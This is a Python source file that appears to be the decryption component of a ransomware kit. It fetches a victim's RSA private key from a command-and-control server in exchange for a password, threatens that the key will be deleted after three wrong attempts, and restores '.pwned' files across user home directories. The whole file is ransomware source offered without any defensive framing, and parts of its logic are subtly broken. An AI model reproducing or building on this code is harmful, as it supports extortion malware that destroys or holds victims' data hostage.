from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import os, random, sys, string
import requests
import ctypes
import uuid

#########  GLOBAL VARIABLES CHANGED PER SESSION ###########
# URL of C2 server

SERVER = "http://localhost:5000"
CONFIG_FILE_NAME = "config.pwnmaster"
PRIVATEKEYFILE = "private_key.pem"
_uuid = ""

WINDOWS_ROOT = "C:/Users/"
LINUX_ROOT = "/home"

def get_uuid():
	try:
		_id = ""
		if(os.path.exists(CONFIG_FILE_NAME)):
			with open(CONFIG_FILE_NAME, "rb") as file:
				_id = file.read()
			file.close()
		else:
			print("No config file can to found, and without it decryption is impossible. We warned you!  Goodbye")
			sys.exit()
		return _id
	except Exception as e:
		print(e)
		pass
def get_password():
	try:
		print("Warning: You only get 3 attempts at entering a password, then your key is wiped.")
		trial_password = raw_input("Please enter your password: ")
		return str(trial_password)
	except Exception as e:
		print(e)
		pass
def get_private_key():
	try:
		password = get_password()
		key = requests.get(SERVER + "/decrypt/" + _uuid + "/" + password)

		if(key.status_code != 200):
			print("Server offline, exiting...")
			sys.exit()
		else:
			if(key.content == "-1"):
				print("Wrong password, be careful!!")
				print("Remember, you only get 3 tries")
				sys.exit()
			elif(key.content == "-2"):
				print("Oh no, your key was deleted! We warned you!!")
				print("Recovery is now impossible. You should have listened.")
				sys.exit()
			else: 
				print("You private key was recovered!!!")
				print("Your private key is: ")
				print(key.content)
				print(" ")
				print("Writing private key to file at " + os.getcwd() + "/" + PRIVATEKEYFILE)
				with open(PRIVATEKEYFILE, "wb") as file:
					file.write(key.content)
				file.close()
				print("Private key created successfully!")
	except Exception as e:
		print(e)
		pass
def load_key():
	try:
		with open(PRIVATEKEYFILE, "rb") as f:
			private_key_string = f.read()
		f.close()

		private_key = RSA.importKey(private_key_string)
		print("Private key imported successfully..")
		return private_key
	except Exception as e:
		print(e)
		pass
def decrypt_message(_private_key, encrypted_message):
	try:
		decrypt_cipher = PKCS1_OAEP.new(_private_key)
		decrypted = decrypt_cipher.decrypt(encrypted_message)
		return decrypted
	except Exception as e:
		print(e)
		pass
def decrypt_file(filename, _private_key):
	try:
		with open(filename, "rb") as file:
			encrypted_message = file.read()
		file.close()
		decrypted_message = decrypt_message(_private_key, encrypted_message)
		restore_file(filename, decrypted_message)
	except Exception as e:
		print(e)
def restore_file(filename, decrypted_message):
	#new_file_name assumes all encrypted files end in .pwned, so strips the extenstion
	try:
		new_file_name = os.path.splitext(filename)[0]
		new_file = open(filename, "wb")
		new_file.write(decrypted_message)
		new_file.close()
		os.rename(filename, new_file_name)
		print(new_file_name + " recovered successfully!!")
	except Exception as e:
		print(e)
		pass
def traverse_and_decrypt(root_directory, key):
	try:
		for dirpath, dirs, files in os.walk(root_directory):
			path = dirpath.split('/')
			for f in files:
				if(f.endswith(".pwned")):
					if(dirpath == root_directory):
						f_name = root_directory + "/" + f
					else:
						f_name = dirpath + "/" + f
					#print(f_name)
					decrypt_file(f_name, key)
	except Exception as e:
		print(e)
		pass


_uuid = get_uuid()
print(_uuid)
get_private_key()
key = load_key()
if(os.name == "posix"):
	traverse_and_decrypt(LINUX_ROOT, key)
elif(os.name == "nt"):
	traverse_and_decrypt(WINDOWS_ROOT, key)

